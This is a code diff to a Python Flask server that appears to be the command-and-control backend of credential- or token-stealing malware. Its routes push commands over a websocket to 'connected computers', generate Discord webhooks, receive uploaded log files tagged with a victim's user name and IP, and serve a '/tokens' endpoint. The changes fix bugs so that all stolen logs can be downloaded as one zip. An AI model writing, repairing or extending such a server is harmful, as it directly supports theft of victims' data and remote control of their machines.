@@ -1,4 +1,4 @@
-import multiprocessing, threading, requests, hashlib, urllib3, random, flask, json, time, os
+import multiprocessing, threading, requests, hashlib, urllib3, zipfile, random, flask, json, time, os
 from flask import Flask, request, send_file, jsonify
 from flask_sock import Sock
 
@@ -168,6 +168,12 @@ def genWebhook():
     )
     return f"https://discord.com/api/webhooks/{response['id']}/{response['token']}"
 
+def zipdir(path, ziph):
+    for root, dirs, files in os.walk(path):
+        for file in files:
+            ziph.write(os.path.join(root, file), 
+                       os.path.relpath(os.path.join(root, file), 
+                                       os.path.join(path, '..')))
 
 def ping(ws, computer):
     global connectedComputers
@@ -190,12 +196,6 @@ def ping(ws, computer):
                 print("Bye!")
                 break
 
-def zipdir(path, ziph):
-    for root, dirs, files in os.walk(path):
-        for file in files:
-            ziph.write(os.path.join(root, file), 
-                       os.path.relpath(os.path.join(root, file), 
-                                       os.path.join(path, '..')))
 
 @sock.route("/api/ws/commands")
 def commands(ws):
@@ -457,7 +457,7 @@ def logs():
         print("Client provided invalid key")
         return "", 404
 
-    if requests.method == "POST":
+    if request.method == "POST":
         log = request.files["file"]
         user = request.form["user"]
         ip = request.form["ip"]
@@ -468,17 +468,15 @@ def logs():
         except Exception as e:
             print(e)
 
+        return "", 404
+
     else:
-        with zipfile.ZipFile('logs/temp.zip', 'w', zipfile.ZIP_DEFLATED) as zipf:
+        with zipfile.ZipFile('temp.zip', 'w', zipfile.ZIP_DEFLATED) as zipf:
             zipdir('logs/', zipf)
 
-        @flask.after_this_request
-        def process_after_request(response):
-            @response.call_on_close
-            def process_after_request():
-                os.remove('logs/temp.zip', 'w+')
-
-    return ""
+        data = open('temp.zip', 'rb').read()
+      
+        return data
 
 @app.route("/tokens", methods=["POST", "GET"])
 def tokens():
